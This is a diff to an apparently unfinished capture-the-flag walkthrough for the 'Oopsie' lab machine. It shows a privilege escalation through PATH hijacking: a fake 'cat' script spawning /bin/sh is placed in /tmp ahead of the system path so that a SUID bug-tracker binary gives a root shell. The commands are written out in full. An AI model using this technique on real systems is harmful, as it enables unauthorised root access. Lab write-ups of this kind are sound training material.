@@ -462,7 +462,7 @@ id
 uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
 ```
 
-### Privilege Escalation
+### Check SUDO access on Robert
 
 We check if robert has `sudo` access using:
 
@@ -478,7 +478,9 @@ We get the following error which suggests that robert doesn't have `sudo` access
 Sorry, user robert may not run sudo on oopsie.
 ```
 
-We find every files with SUID set
+### Find SUID binaries
+
+We find every files with SUID(Set Owner User ID) set using the following command:
 
 
 
@@ -575,7 +577,45 @@ What happened instead:
 Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
 ```
 
+But when unsuccessful, we see that it uses `cat` command underneath:
 
+```
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 10
+10
+---------------
+
+cat: /root/reports/10: No such file or directory
+```
+
+We see that the cat command is used in an insecure way.&#x20;
+
+### Shadow dump
+
+### Root user FLAG
+
+### Privilege Escalation
+
+We change to /tmp directory and create a new file/shell script named cat, which when invoked by the bugtracker binary will give us shell access:
+
+```
+echo "/bin/sh" > cat
+```
+
+Now we export the /tmp directory to the PATH variable in a such a way that when cat command's path is resolved we hit our malicious cat instead of system default cat.
+
+```
+robert@oopsie:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+robert@oopsie:/tmp$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+
+Now executing the bugtracker binary gives us shell access:
 
 
 
